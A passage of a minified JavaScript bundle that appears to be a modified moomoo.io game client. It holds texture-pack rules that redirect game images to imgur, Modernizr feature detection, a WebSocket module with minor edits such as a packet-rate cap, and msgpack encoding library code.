destination:"",source:{key:"Url",operator:"Contains",value:".././img/animals/wolf_1.png"}},{destination:"",source:{key:"Url",operator:"Contains",value:".././img/animals/cow_1.png"}},{destination:"",source:{key:"Url",operator:"Contains",value:".././img/animals/pig_1.png"}},{destination:"",source:{key:"Url",operator:"Contains",value:".././img/animals/chicken_1.png"}},{destination:"https://i.imgur.com/MKOvEr6.png",source:{key:"Url",operator:"Contains",value:".././img/animals/enemy.png"}},{destination:"https://i.imgur.com/MKOvEr6.png",source:{key:"Url",operator:"Contains",value:".././img/animals/enemy.png"}}],ruleType:"Redirect",status:"Active"},{creationDate:1509892380958,description:"",groupId:"",id:"Redirect_1509892380958",name:"Texture Pack Private - Weapons - Part 1",objectType:"rule",pairs:[{destination:"https://i.imgur.com/DTd8Xl6.png",source:{key:"Url",operator:"Contains",value:"http://dev.moomoo.io/img/weapons/stick_1_g.png"}},{destination:"https://i.imgur.com/DTd8Xl6.png",source:{key:"Url",operator:"Contains",value:"https://dev.moomoo.io/img/weapons/stick_1_g.png"}},{destination:"https://i.imgur.com/RnkmWgs.png",source:{key:"Url",operator:"Contains",value:"http://dev.moomoo.io/img/weapons/stick_1_d.png"}},{destination:"https://i.imgur.com/RnkmWgs.png",source:{key:"Url",operator:"Contains",value:"https://dev.moomoo.io/img/weapons/stick_1_d.png"}},{destination:"https://i.imgur.com/ROTb7Ks.png",source:{key:"Url",operator:"Contains",value:"http://dev.moomoo.io/img/weapons/dagger_1_d.png"}},{destination:"https://i.imgur.com/ROTb7Ks.png",source:{key:"Url",operator:"Contains",value:"https://dev.moomoo.io/img/weapons/dagger_1_d.png"}},{destination:"https://i.imgur.com/ivLPh10.png",source:{key:"Url",operator:"Contains",value:"http://dev.moomoo.io/img/weapons/bat_1_g.png"}},{destination:"https://i.imgur.com/ivLPh10.png",source:{key:"Url",operator:"Contains",value:"https://dev.moomoo.io/img/weapons/bat_1_g.png"}},{destination:"https://i.imgur.com/phXTNsa.png",source:{key:"Url",operator:"Contains",value:"http://dev.moomoo.io/img/weapons/bat_1_d.png"}},{destination:"https://i.imgur.com/phXTNsa.png",source:{key:"Url",operator:"Contains",value:"https://dev.moomoo.io/img/weapons/bat_1_d.png"}}],ruleType:"Redirect",status:"Active"},{creationDate:1509804753627,description:"",groupId:"",id:"Redirect_1509804753627",name:"Texture Pack - Weapons - Part 1",objectType:"rule",pairs:[{destination:"https://i.imgur.com/DTd8Xl6.png",source:{key:"Url",operator:"Contains",value:".././img/weapons/stick_1_g.png"}},{destination:"https://i.imgur.com/DTd8Xl6.png",source:{key:"Url",operator:"Contains",value:".././img/weapons/stick_1_g.png"}},{destination:"https://i.imgur.com/RnkmWgs.png",source:{key:"Url",operator:"Contains",value:".././img/weapons/stick_1_d.png"}},{destination:"https://i.imgur.com/RnkmWgs.png",source:{key:"Url",operator:"Contains",value:".././img/weapons/stick_1_d.png"}},{destination:"https://i.imgur.com/ivLPh10.png",source:{key:"Url",operator:"Contains",value:".././img/weapons/bat_1_g.png"}},{destination:"https://i.imgur.com/ivLPh10.png",source:{key:"Url",operator:"Contains",value:".././img/weapons/bat_1_g.png"}},{destination:"https://i.imgur.com/phXTNsa.png",source:{key:"Url",operator:"Contains",value:".././img/weapons/bat_1_d.png"}},{destination:"https://i.imgur.com/phXTNsa.png",source:{key:"Url",operator:"Contains",value:".././img/weapons/bat_1_d.png"}},{destination:"https://i.imgur.com/ROTb7Ks.png",source:{key:"Url",operator:"Contains",value:".././img/weapons/dagger_1_d.png"}},{destination:"https://i.imgur.com/ROTb7Ks.png",source:{key:"Url",operator:"Contains",value:".././img/weapons/dagger_1_d.png"}},{destination:"https://i.imgur.com/qu7HHT5.png",source:{key:"Url",operator:"Contains",value:".././img/weapons/bow_1_d.png"}},{destination:"https://i.imgur.com/qu7HHT5.png",source:{key:"Url",operator:"Contains",value:".././img/weapons/bow_1_d.png"}},{destination:"https://i.imgur.com/DVjCdwI.png",source:{key:"Url",operator:"Contains",value:".././img/weapons/crossbow_2_d.png"}},{destination:"https://i.imgur.com/DVjCdwI.png",source:{key:"Url",operator:"Contains",value:".././img/weapons/crossbow_2_d.png"}},{destination:"https://i.imgur.com/HSWcyku.png",source:{key:"Url",operator:"Contains",value:".././img/weapons/spear_1_d.png"}},{destination:"https://i.imgur.com/HSWcyku.png",source:{key:"Url",operator:"Contains",value:".././img/weapons/spear_1_d.png"}}],ruleType:"Redirect",status:"Active"},{creationDate:1508326116062,description:"",groupId:"",id:"Redirect_1508326116062",name:"Texture Pack Private - Hats",objectType:"rule",pairs:[{destination:"https://i.imgur.com/pe3Yx3F.png",source:{key:"Url",operator:"Contains",value:"https://dev.moomoo.io/img/hats/hat_40.png"}},{destination:"https://i.imgur.com/in5H6vw.png",source:{key:"Url",operator:"Contains",value:"https://dev.moomoo.io/img/hats/hat_18.png"}},{destination:"https://i.imgur.com/4ddZert.png",source:{key:"Url",operator:"Contains",value:"https://dev.moomoo.io/img/accessories/access_21.png"}},{destination:"https://i.imgur.com/sULkUZT.png",source:{key:"Url",operator:"Contains",value:"https://dev.moomoo.io/img/accessories/access_19.png"}},{destination:"https://i.imgur.com/gJY7sM6.png",source:{key:"Url",operator:"Contains",value:"https://dev.moomoo.io/img/hats/hat_9.png"}},{destination:"https://i.imgur.com/uYgDtcZ.png",source:{key:"Url",operator:"Contains",value:"https://dev.moomoo.io/img/hats/hat_16.png"}},{destination:"https://i.imgur.com/JPMqgSc.png",source:{key:"Url",operator:"Contains",value:"https://dev.moomoo.io/img/hats/hat_31.png"}},{destination:"https://i.imgur.com/vAOzlyY.png",source:{key:"Url",operator:"Contains",value:"https://dev.moomoo.io/img/hats/hat_7.png"}},{destination:"https://i.imgur.com/YRQ8Ybq.png",source:{key:"Url",operator:"Contains",value:"https://dev.moomoo.io/img/hats/hat_15.png"}},{destination:"https://i.imgur.com/EwkbsHN.png",source:{key:"Url",operator:"Contains",value:"https://dev.moomoo.io/img/hats/hat_13.png"}},{destination:"https://i.imgur.com/yfqME8H.png",source:{key:"Url",operator:"Contains",value:"https://dev.moomoo.io/img/hats/hat_11.png"}},{destination:"https://i.imgur.com/f5uhWCk.png",source:{key:"Url",operator:"Contains",value:"https://dev.moomoo.io/img/hats/hat_20.png"}},{destination:"https://i.imgur.com/yfqME8H.png",source:{key:"Url",operator:"Contains",value:"https://dev.moomoo.io/img/hats/hat_11_p.png"}},{destination:"https://i.imgur.com/V8JrIwv.png",source:{key:"Url",operator:"Contains",value:"https://dev.moomoo.io/img/hats/hat_14_p.png"}},{destination:"https://i.imgur.com/V8JrIwv.png",source:{key:"Url",operator:"Contains",value:"https://dev.moomoo.io/img/hats/hat_14.png"}},{destination:"https://i.imgur.com/s7Cxc9y.png",source:{key:"Url",operator:"Contains",value:"https://dev.moomoo.io/img/hats/hat_14_top.png"}},{destination:"https://i.imgur.com/s7Cxc9y.png",source:{key:"Url",operator:"Contains",value:"https://dev.moomoo.io/img/hats/hat_11_top.png"}},{destination:"https://i.imgur.com/pe3Yx3F.png",source:{key:"Url",operator:"Contains",value:"http://dev.moomoo.io/img/hats/hat_40.png"}},{destination:"https://i.imgur.com/in5H6vw.png",source:{key:"Url",operator:"Contains",value:"http://dev.moomoo.io/img/hats/hat_18.png"}},{destination:"https://i.imgur.com/gJY7sM6.png",source:{key:"Url",operator:"Contains",value:"http://dev.moomoo.io/img/hats/hat_9.png"}},{destination:"https://i.imgur.com/4ddZert.png",source:{key:"Url",operator:"Contains",value:"http://dev.moomoo.io/img/accessories/access_21.png"}},{destination:"https://i.imgur.com/sULkUZT.png",source:{key:"Url",operator:"Contains",value:"http://dev.moomoo.io/img/accessories/access_19.png"}},{destination:"https://i.imgur.com/vAOzlyY.png",source:{key:"Url",operator:"Contains",value:"http://dev.moomoo.io/img/hats/hat_7.png"}},{destination:"https://i.imgur.com/uYgDtcZ.png",source:{key:"Url",operator:"Contains",value:"http://dev.moomoo.io/img/hats/hat_16.png"}},{destination:"https://i.imgur.com/JPMqgSc.png",source:{key:"Url",operator:"Contains",value:"http://dev.moomoo.io/img/hats/hat_31.png"}},{destination:"https://i.imgur.com/YRQ8Ybq.png",source:{key:"Url",operator:"Contains",value:"http://dev.moomoo.io/img/hats/hat_15.png"}},{destination:"https://i.imgur.com/EwkbsHN.png",source:{key:"Url",operator:"Contains",value:"http://dev.moomoo.io/img/hats/hat_13.png"}},{destination:"https://i.imgur.com/yfqME8H.png",source:{key:"Url",operator:"Contains",value:"http://dev.moomoo.io/img/hats/hat_11.png"}},{destination:"https://i.imgur.com/f5uhWCk.png",source:{key:"Url",operator:"Contains",value:"http://dev.moomoo.io/img/hats/hat_20.png"}},{destination:"https://i.imgur.com/yfqME8H.png",source:{key:"Url",operator:"Contains",value:"http://dev.moomoo.io/img/hats/hat_11_p.png"}},{destination:"https://i.imgur.com/V8JrIwv.png",source:{key:"Url",operator:"Contains",value:"http://dev.moomoo.io/img/hats/hat_14_p.png"}},{destination:"https://i.imgur.com/V8JrIwv.png",source:{key:"Url",operator:"Contains",value:"http://dev.moomoo.io/img/hats/hat_14.png"}},{destination:"https://i.imgur.com/s7Cxc9y.png",source:{key:"Url",operator:"Contains",value:"http://dev.moomoo.io/img/hats/hat_11_top.png"}},{destination:"https://i.imgur.com/s7Cxc9y.png",source:{key:"Url",operator:"Contains",value:"http://dev.moomoo.io/img/hats/hat_14_top.png"}},{destination:"https://i.imgur.com/I0xGtyZ.png",source:{key:"Url",operator:"Contains",value:"http://dev.moomoo.io/img/hats/hat_26.png"}},{destination:"https://i.imgur.com/I0xGtyZ.png",source:{key:"Url",operator:"Contains",value:"https://dev.moomoo.io/img/hats/hat_26.png"}},{destination:"https://i.imgur.com/hmJrVQz.png",source:{key:"Url",operator:"Contains",value:"http://dev.moomoo.io/img/hats/hat_52.png"}},{destination:"https://i.imgur.com/hmJrVQz.png",source:{key:"Url",operator:"Contains",value:"https://dev.moomoo.io/img/hats/hat_52.png"}}],ruleType:"Redirect",status:"Active"},{creationDate:1507417062355,description:"",groupId:"",id:"Redirect_1507417062355",name:"Texture Pack - Hats",objectType:"rule",pairs:[{destination:"https://i.imgur.com/pe3Yx3F.png",source:{key:"Url",operator:"Contains",value:".././img/hats/hat_40.png"}},{destination:"https://i.imgur.com/4ddZert.png",source:{key:"Url",operator:"Contains",value:".././img/accessories/access_21.png"}},{destination:"https://i.imgur.com/sULkUZT.png",source:{key:"Url",operator:"Contains",value:".././img/accessories/access_19.png"}},{destination:"https://i.imgur.com/in5H6vw.png",source:{key:"Url",operator:"Contains",value:".././img/hats/hat_18.png"}},{destination:"https://i.imgur.com/gJY7sM6.png",source:{key:"Url",operator:"Contains",value:".././img/hats/hat_9.png"}},{destination:"https://i.imgur.com/vAOzlyY.png",source:{key:"Url",operator:"Contains",value:".././img/hats/hat_7.png"}},{destination:"https://i.imgur.com/uYgDtcZ.png",source:{key:"Url",operator:"Contains",value:".././img/hats/hat_16.png"}},{destination:"https://i.imgur.com/JPMqgSc.png",source:{key:"Url",operator:"Contains",value:".././img/hats/hat_31.png"}},{destination:"https://i.imgur.com/YRQ8Ybq.png",source:{key:"Url",operator:"Contains",value:".././img/hats/hat_15.png"}},{destination:"https://i.imgur.com/EwkbsHN.png",source:{key:"Url",operator:"Contains",value:".././img/hats/hat_13.png"}},{destination:"https://i.imgur.com/yfqME8H.png",source:{key:"Url",operator:"Contains",value:".././img/hats/hat_11.png"}},{destination:"https://i.imgur.com/f5uhWCk.png",source:{key:"Url",operator:"Contains",value:".././img/hats/hat_20.png"}},{destination:"https://i.imgur.com/yfqME8H.png",source:{key:"Url",operator:"Contains",value:".././img/hats/hat_11_p.png"}},{destination:"https://i.imgur.com/V8JrIwv.png",source:{key:"Url",operator:"Contains",value:".././img/hats/hat_14_p.png"}},{destination:"https://i.imgur.com/V8JrIwv.png",source:{key:"Url",operator:"Contains",value:".././img/hats/hat_14.png"}},{destination:"https://i.imgur.com/s7Cxc9y.png",source:{key:"Url",operator:"Contains",value:".././img/hats/hat_14_top.png"}},{destination:"https://i.imgur.com/s7Cxc9y.png",source:{key:"Url",operator:"Contains",value:".././img/hats/hat_11_top.png"}},{destination:"https://i.imgur.com/pe3Yx3F.png",source:{key:"Url",operator:"Contains",value:".././img/hats/hat_40.png"}},{destination:"https://i.imgur.com/vAOzlyY.png",source:{key:"Url",operator:"Contains",value:".././img/hats/hat_7.png"}},{destination:"https://i.imgur.com/uYgDtcZ.png",source:{key:"Url",operator:"Contains",value:".././img/hats/hat_16.png"}},{destination:"https://i.imgur.com/gJY7sM6.png",source:{key:"Url",operator:"Contains",value:".././img/hats/hat_9.png"}},{destination:"https://i.imgur.com/JPMqgSc.png",source:{key:"Url",operator:"Contains",value:".././img/hats/hat_31.png"}},{destination:"https://i.imgur.com/4ddZert.png",source:{key:"Url",operator:"Contains",value:".././img/accessories/access_21.png"}},{destination:"https://i.imgur.com/sULkUZT.png",source:{key:"Url",operator:"Contains",value:".././img/accessories/access_19.png"}},{destination:"https://i.imgur.com/YRQ8Ybq.png",source:{key:"Url",operator:"Contains",value:".././img/hats/hat_15.png"}},{destination:"https://i.imgur.com/EwkbsHN.png",source:{key:"Url",operator:"Contains",value:".././img/hats/hat_13.png"}},{destination:"https://i.imgur.com/yfqME8H.png",source:{key:"Url",operator:"Contains",value:".././img/hats/hat_11.png"}},{destination:"https://i.imgur.com/in5H6vw.png",source:{key:"Url",operator:"Contains",value:".././img/hats/hat_18.png"}},{destination:"https://i.imgur.com/f5uhWCk.png",source:{key:"Url",operator:"Contains",value:".././img/hats/hat_20.png"}},{destination:"https://i.imgur.com/yfqME8H.png",source:{key:"Url",operator:"Contains",value:".././img/hats/hat_11_p.png"}},{destination:"https://i.imgur.com/V8JrIwv.png",source:{key:"Url",operator:"Contains",value:".././img/hats/hat_14_p.png"}},{destination:"https://i.imgur.com/V8JrIwv.png",source:{key:"Url",operator:"Contains",value:".././img/hats/hat_14.png"}},{destination:"https://i.imgur.com/s7Cxc9y.png",source:{key:"Url",operator:"Contains",value:".././img/hats/hat_11_top.png"}},{destination:"https://i.imgur.com/s7Cxc9y.png",source:{key:"Url",operator:"Contains",value:".././img/hats/hat_14_top.png"}},{destination:"https://i.imgur.com/I0xGtyZ.png",source:{key:"Url",operator:"Contains",value:".././img/hats/hat_26.png"}},{destination:"https://i.imgur.com/I0xGtyZ.png",source:{key:"Url",operator:"Contains",value:".././img/hats/hat_26.png"}},{destination:"https://i.imgur.com/hmJrVQz.png",source:{key:"Url",operator:"Contains",value:".././img/hats/hat_52.png"}},{destination:"https://i.imgur.com/hmJrVQz.png",source:{key:"Url",operator:"Contains",value:".././img/hats/hat_52.png"}}],ruleType:"Redirect",status:"Active"}];
                    packs = TEXTURE(localStorage.getItem("texture") ? JSON.parse(localStorage.getItem("texture")) : localTexture);
                }, function(e, t) {
                    ! function(e, t, n) {
                        function i(e, t) {
                            return typeof e === t
                        }
                        var r = [],
                            s = [],
                            a = {
                                _version: "3.5.0",
                                _config: {
                                    classPrefix: "",
                                    enableClasses: !0,
                                    enableJSClass: !0,
                                    usePrefixes: !0
                                },
                                _q: [],
                                on: function(e, t) {
                                    var n = this;
                                    setTimeout((function() {
                                        t(n[e])
                                    }), 0)
                                },
                                addTest: function(e, t, n) {
                                    s.push({
                                        name: e,
                                        fn: t,
                                        options: n
                                    })
                                },
                                addAsyncTest: function(e) {
                                    s.push({
                                        name: null,
                                        fn: e
                                    })
                                }
                            },
                            o = function() {};
                        o.prototype = a, o = new o;
                        var c = t.documentElement,
                            l = "svg" === c.nodeName.toLowerCase();
                        o.addTest("passiveeventlisteners", (function() {
                            var t = !1;
                            try {
                                var n = Object.defineProperty({}, "passive", {
                                    get: function() {
                                        t = !0
                                    }
                                });
                                e.addEventListener("test", null, n)
                            } catch (e) {}
                            return t
                        })),
                            function() {
                            var e, t, n, a, c, l;
                            for (var h in s)
                                if (s.hasOwnProperty(h)) {
                                    if (e = [], (t = s[h]).name && (e.push(t.name.toLowerCase()), t.options && t.options.aliases && t.options.aliases.length))
                                        for (n = 0; n < t.options.aliases.length; n++) e.push(t.options.aliases[n].toLowerCase());
                                    for (a = i(t.fn, "function") ? t.fn() : t.fn, c = 0; c < e.length; c++) 1 === (l = e[c].split(".")).length ? o[l[0]] = a : (!o[l[0]] || o[l[0]] instanceof Boolean || (o[l[0]] = new Boolean(o[l[0]])), o[l[0]][l[1]] = a), r.push((a ? "" : "no-") + l.join("-"))
                                }
                        }(),
                            function(e) {
                            var t = c.className,
                                n = o._config.classPrefix || "";
                            if (l && (t = t.baseVal), o._config.enableJSClass) {
                                var i = new RegExp("(^|\\s)" + n + "no-js(\\s|$)");
                                t = t.replace(i, "$1" + n + "js$2")
                            }
                            o._config.enableClasses && (t += " " + n + e.join(" " + n), l ? c.className.baseVal = t : c.className = t)
                        }(r), delete a.addTest, delete a.addAsyncTest;
                        for (var h = 0; h < o._q.length; h++) o._q[h]();
                        e.Modernizr = o
                    }(window, document)
                }, function(e, t, n) {
                    var i = n(24),lastAimPacket = 1;
                    n(19), e.exports = {
                        socket: null,
                        connected: !1,
                        socketId: -1,
                        connect: function(e, t, n) {
                            if (!this.socket) {
                                var r = this;
                                try {
                                    var s = !1,
                                        a = e;
                                    this.socket = new WebSocket(a), this.socket.binaryType = "arraybuffer", this.socket.onmessage = function(e) {
                                        /*
                                        datas.push([Date.now() - timeStart, new Uint8Array(e.data)]);
                                        */
                                        var t = new Uint8Array(e.data),
                                            s = i.decode(t),
                                            a = s[0];
                                        t = s[1], "io-init" == a ? r.socketId = t[0] : n[a].apply(void 0, t)
                                    }, this.socket.onopen = function() {
                                        r.connected = !0, t()
                                    }, this.socket.onclose = function(e) {
                                        r.connected = !1, 4001 == e.code ? t("Invalid Connection") : s || t("disconnected")
                                        onbeforeunload = null;
                                        location.reload();
                                    }, this.socket.onerror = function(e) {
                                        this.socket && this.socket.readyState != WebSocket.OPEN && (s = !0, console.error("Socket error", arguments), t("Socket error"))
                                    }
                                } catch (e) {
                                    console.warn("Socket connection error:", e), t(e)
                                }
                            }
                        },
                        send: function(e) {
                            if(window.pps >= 90) return;
                            var t = Array.prototype.slice.call(arguments, 1),
                                n = i.encode([e, t]);
                            try {
                                this.socket.send(n)
                            } catch (t) {};
                        },
                        _send: function (e) {
                            this.socket.send(e);
                        },
                        socketReady: function() {
                            return this.socket && this.connected
                        },
                        close: function() {
                            this. socket && this.socket.close()
                        }
                    }
                }, function(e, t, n) {
                    t.encode = n(9).encode, t.decode = n(15).decode, t.Encoder = n(37).Encoder, t.Decoder = n(38).Decoder, t.createCodec = n(39).createCodec, t.codec = n(40).codec
                }, function(e, t, n) {
                    (function(t) {
                        function n(e) {
                            return e && e.isBuffer && e
                        }
                        e.exports = n(void 0 !== t && t) || n(this.Buffer) || n("undefined" != typeof window && window.Buffer) || this.Buffer
                    }).call(this, n(11).Buffer)
                }, function(e, t, n) {
                    "use strict";
                    t.byteLength = function(e) {
                        var t = l(e),
                            n = t[0],
                            i = t[1];
                        return 3 * (n + i) / 4 - i
                    }, t.toByteArray = function(e) {
                        var t, n, i = l(e),
                            a = i[0],
                            o = i[1],
                            c = new s(function(e, t, n) {
                                return 3 * (t + n) / 4 - n
                            }(0, a, o)),
                            h = 0,
                            u = o > 0 ? a - 4 : a;
                        for (n = 0; n < u; n += 4) t = r[e.charCodeAt(n)] << 18 | r[e.charCodeAt(n + 1)] << 12 | r[e.charCodeAt(n + 2)] << 6 | r[e.charCodeAt(n + 3)], c[h++] = t >> 16 & 255, c[h++] = t >> 8 & 255, c[h++] = 255 & t;
                        return 2 === o && (t = r[e.charCodeAt(n)] << 2 | r[e.charCodeAt(n + 1)] >> 4, c[h++] = 255 & t), 1 === o && (t = r[e.charCodeAt(n)] << 10 | r[e.charCodeAt(n + 1)] << 4 | r[e.charCodeAt(n + 2)] >> 2, c[h++] = t >> 8 & 255, c[h++] = 255 & t), c
                    }, t.fromByteArray = function(e) {
                        for (var t, n = e.length, r = n % 3, s = [], a = 0, o = n - r; a < o; a += 16383) s.push(u(e, a, a + 16383 > o ? o : a + 16383));
                        return 1 === r ? (t = e[n - 1], s.push(i[t >> 2] + i[t << 4 & 63] + "==")) : 2 === r && (t = (e[n - 2] << 8) + e[n - 1], s.push(i[t >> 10] + i[t >> 4 & 63] + i[t << 2 & 63] + "=")), s.join("")
                    };
                    for (var i = [], r = [], s = "undefined" != typeof Uint8Array ? Uint8Array : Array, a = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/", o = 0, c = a.length; o < c; ++o) i[o] = a[o], r[a.charCodeAt(o)] = o;

                    function l(e) {
                        var t = e.length;
                        if (t % 4 > 0) throw new Error("Invalid string. Length must be a multiple of 4");
                        var n = e.indexOf("=");
                        return -1 === n && (n = t), [n, n === t ? 0 : 4 - n % 4]
                    }

                    function h(e) {
                        return i[e >> 18 & 63] + i[e >> 12 & 63] + i[e >> 6 & 63] + i[63 & e]
                    }

                    function u(e, t, n) {
                        for (var i, r = [], s = t; s < n; s += 3) i = (e[s] << 16 & 16711680) + (e[s + 1] << 8 & 65280) + (255 & e[s + 2]), r.push(h(i));
                        return r.join("")
                    }
                    r["-".charCodeAt(0)] = 62, r["_".charCodeAt(0)] = 63
                }, function(e, t) {
                    var n = {}.toString;
                    e.exports = Array.isArray || function(e) {
                        return "[object Array]" == n.call(e)
                    }
                }, function(e, t, n) {
                    var i = n(0);

                    function r(e) {
                        return new Array(e)
                    }(t = e.exports = r(0)).alloc = r, t.concat = i.concat, t.from = function(e) {
                        if (!i.isBuffer(e) && i.isView(e)) e = i.Uint8Array.from(e);
                        else if (i.isArrayBuffer(e)) e = new Uint8Array(e);
                        else {
                            if ("string" == typeof e) return i.from.call(t, e);
                            if ("number" == typeof e) throw new TypeError('"value" argument must not be a number')
                        }
                        return Array.prototype.slice.call(e)
                    }
                }, function(e, t, n) {
                    var i = n(0),
                        r = i.global;

                    function s(e) {
                        return new r(e)
                    }(t = e.exports = i.hasBuffer ? s(0) : []).alloc = i.hasBuffer && r.alloc || s, t.concat = i.concat, t.from = function(e) {
                        if (!i.isBuffer(e) && i.isView(e)) e = i.Uint8Array.from(e);
                        else if (i.isArrayBuffer(e)) e = new Uint8Array(e);
                        else {
                            if ("string" == typeof e) return i.from.call(t, e);
                            if ("number" == typeof e) throw new TypeError('"value" argument must not be a number')
                        }
                        return r.from && 1 !== r.from.length ? r.from(e) : new r(e)
                    }
                }, function(e, t, n) {
                    var i = n(0);

                    function r(e) {
                        return new Uint8Array(e)
                    }(t = e.exports = i.hasArrayBuffer ? r(0) : []).alloc = r, t.concat = i.concat, t.from = function(e) {
                        if (i.isView(e)) {
                            var n = e.byteOffset,
                                r = e.byteLength;
                            (e = e.buffer).byteLength !== r && (e.slice ? e = e.slice(n, n + r) : (e = new Uint8Array(e)).byteLength !== r && (e = Array.prototype.slice.call(e, n, n + r)))
                        } else {
                            if ("string" == typeof e) return i.from.call(t, e);
                            if ("number" == typeof e) throw new TypeError('"value" argument must not be a number')
                        }
                        return new Uint8Array(e)
                    }
                }, function(e, t) {
                    t.copy = function(e, t, n, i) {
                        var r;
                        n || (n = 0), i || 0 === i || (i = this.length), t || (t = 0);
                        var s = i - n;
                        if (e === this && n < t && t < i)
                            for (r = s - 1; r >= 0; r--) e[r + t] = this[r + n];
                        else
                            for (r = 0; r < s; r++) e[r + t] = this[r + n];
                        return s
                    }, t.toString = function(e, t, n) {
                        var i = 0 | t;
                        n || (n = this.length);
                        for (var r = "", s = 0; i < n;)(s = this[i++]) < 128 ? r += String.fromCharCode(s) : (192 == (224 & s) ? s = (31 & s) << 6 | 63 & this[i++] : 224 == (240 & s) ? s = (15 & s) << 12 | (63 & this[i++]) << 6 | 63 & this[i++] : 240 == (248 & s) && (s = (7 & s) << 18 | (63 & this[i++]) << 12 | (63 & this[i++]) << 6 | 63 & this[i++]), s >= 65536 ? (s -= 65536, r += String.fromCharCode(55296 + (s >>> 10), 56320 + (1023 & s))) : r += String.fromCharCode(s));
                        return r
                    }, t.write = function(e, t) {
                        for (var n = t || (t |= 0), i = e.length, r = 0, s = 0; s < i;)(r = e.charCodeAt(s++)) < 128 ? this[n++] = r : r < 2048 ? (this[n++] = 192 | r >>> 6, this[n++] = 128 | 63 & r) : r < 55296 || r > 57343 ? (this[n++] = 224 | r >>> 12, this[n++] = 128 | r >>> 6 & 63, this[n++] = 128 | 63 & r) : (r = 65536 + (r - 55296 << 10 | e.charCodeAt(s++) - 56320), this[n++] = 240 | r >>> 18, this[n++] = 128 | r >>> 12 & 63, this[n++] = 128 | r >>> 6 & 63, this[n++] = 128 | 63 & r);
                        return n - t
                    }
                }, function(e, t, n) {
                    t.setExtPackers = function(e) {
                        e.addExtPacker(14, Error, [u, c]), e.addExtPacker(1, EvalError, [u, c]), e.addExtPacker(2, RangeError, [u, c]), e.addExtPacker(3, ReferenceError, [u, c]), e.addExtPacker(4, SyntaxError, [u, c]), e.addExtPacker(5, TypeError, [u, c]), e.addExtPacker(6, URIError, [u, c]), e.addExtPacker(10, RegExp, [h, c]), e.addExtPacker(11, Boolean, [l, c]), e.addExtPacker(12, String, [l, c]), e.addExtPacker(13, Date, [Number, c]), e.addExtPacker(15, Number, [l, c]), "undefined" != typeof Uint8Array && (e.addExtPacker(17, Int8Array, a), e.addExtPacker(18, Uint8Array, a), e.addExtPacker(19, Int16Array, a), e.addExtPacker(20, Uint16Array, a), e.addExtPacker(21, Int32Array, a), e.addExtPacker(22, Uint32Array, a), e.addExtPacker(23, Float32Array, a), "undefined" != typeof Float64Array && e.addExtPacker(24, Float64Array, a), "undefined" != typeof Uint8ClampedArray && e.addExtPacker(25, Uint8ClampedArray, a), e.addExtPacker(26, ArrayBuffer, a), e.addExtPacker(29, DataView, a)), r.hasBuffer && e.addExtPacker(27, s, r.from)
                    };
                    var i, r = n(0),
                        s = r.global,
                        a = r.Uint8Array.from,
                        o = {
                            name: 1,
                            message: 1,
                            stack: 1,
                            columnNumber: 1,
                            fileName: 1,
                            lineNumber: 1
                        };

                    function c(e) {
                        return i || (i = n(9).encode), i(e)
                    }

                    function l(e) {
                        return e.valueOf()
                    }

                    function h(e) {
                        (e = RegExp.prototype.toString.call(e).split("/")).shift();
                        var t = [e.pop()];
                        return t.unshift(e.join("/")), t
                    }

                    function u(e) {
                        var t = {};
                        for (var n in o) t[n] = e[n];
                        return t
                    }
                }, function(e, t, n) {
                    var i = n(5),
                        r = n(7),
                        s = r.Uint64BE,
                        a = r.Int64BE,
                        o = n(0),
                        c = n(6),
                        l = n(34),
                        h = n(13).uint8,
                        u = n(3).ExtBuffer,
                        f = "undefined" != typeof Uint8Array,
                        d = "undefined" != typeof Map,
                        p = [];
                    p[1] = 212, p[2] = 213, p[4] = 214, p[8] = 215, p[16] = 216, t.getWriteType = function(e) {
                        var t = l.getWriteToken(e),
                            n = e && e.useraw,
                            r = f && e && e.binarraybuffer,
                            g = r ? o.isArrayBuffer : o.isBuffer,
                            m = r ? function(e, t) {
                                w(e, new Uint8Array(t))
                            } : w,
                            y = d && e && e.usemap ? function(e, n) {
                                if (!(n instanceof Map)) return b(e, n);
                                var i = n.size;
                                t[i < 16 ? 128 + i : i <= 65535 ? 222 : 223](e, i);
                                var r = e.codec.encode;
                                n.forEach((function(t, n, i) {
                                    r(e, n), r(e, t)
                                }))
                            } : b;
                        return {
                            boolean: function(e, n) {
                                t[n ? 195 : 194](e, n)
                            },
                            function: v,
                            number: function(e, n) {
                                var i = 0 | n;
                                n === i ? t[-32 <= i && i <= 127 ? 255 & i : 0 <= i ? i <= 255 ? 204 : i <= 65535 ? 205 : 206 : -128 <= i ? 208 : -32768 <= i ? 209 : 210](e, i) : t[203](e, n)
                            },
                            object: n ? function(e, n) {
                                if (g(n)) return function(e, n) {
                                    var i = n.length;
                                    t[i < 32 ? 160 + i : i <= 65535 ? 218 : 219](e, i), e.send(n)
                                }(e, n);
                                k(e, n)
                            } : k,
                            string: function(e) {
                                return function(n, i) {
                                    var r = i.length,
                                        s = 5 + 3 * r;
                                    n.offset = n.reserve(s);
                                    var a = n.buffer,
                                        o = e(r),
                                        l = n.offset + o;
                                    r = c.write.call(a, i, l);
                                    var h = e(r);
                                    if (o !== h) {
                                        var u = l + h - o,
                                            f = l + r;
                                        c.copy.call(a, a, u, l, f)
                                    }
                                    t[1 === h ? 160 + r : h <= 3 ? 215 + h : 219](n, r), n.offset += r
                                }
                            }(n ? function(e) {
                                return e < 32 ? 1 : e <= 65535 ? 3 : 5
                            } : function(e) {
                                return e < 32 ? 1 : e <= 255 ? 2 : e <= 65535 ? 3 : 5
                            }),
                            symbol: v,
                            undefined: v
                        };

                        function k(e, n) {
                            if (null === n) return v(e, n);
                            if (g(n)) return m(e, n);
                            if (i(n)) return function(e, n) {
                                var i = n.length;
                                t[i < 16 ? 144 + i : i <= 65535 ? 220 : 221](e, i);
                                for (var r = e.codec.encode, s = 0; s < i; s++) r(e, n[s])
                            }(e, n);
                            if (s.isUint64BE(n)) return function(e, n) {
                                t[207](e, n.toArray())
                            }(e, n);
                            if (a.isInt64BE(n)) return function(e, n) {
                                t[211](e, n.toArray())
                            }(e, n);
                            var r = e.codec.getExtPacker(n);
                            if (r && (n = r(n)), n instanceof u) return function(e, n) {
                                var i = n.buffer,
                                    r = i.length,
                                    s = p[r] || (r < 255 ? 199 : r <= 65535 ? 200 : 201);
                                t[s](e, r), h[n.type](e), e.send(i)
                            }(e, n);
                            y(e, n)
                        }

                        function v(e, n) {
                            t[192](e, n)
                        }

                        function w(e, n) {
                            var i = n.length;
                            t[i < 255 ? 196 : i <= 65535 ? 197 : 198](e, i), e.send(n)
                        }

                        function b(e, n) {
